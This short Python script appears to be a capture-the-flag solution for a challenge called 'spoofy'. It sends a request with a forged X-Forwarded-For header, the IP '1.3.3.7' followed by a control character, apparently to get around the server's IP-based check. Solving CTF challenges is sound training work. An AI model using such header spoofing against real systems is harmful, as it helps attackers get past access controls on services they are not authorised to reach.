import json
import requests

url = 'https://actf-spoofy.herokuapp.com/'
headers = {"X-Forwarded-For": "1.3.3.7\x1a"}
response = requests.get(url, headers=headers)

print(response)
print(response.text)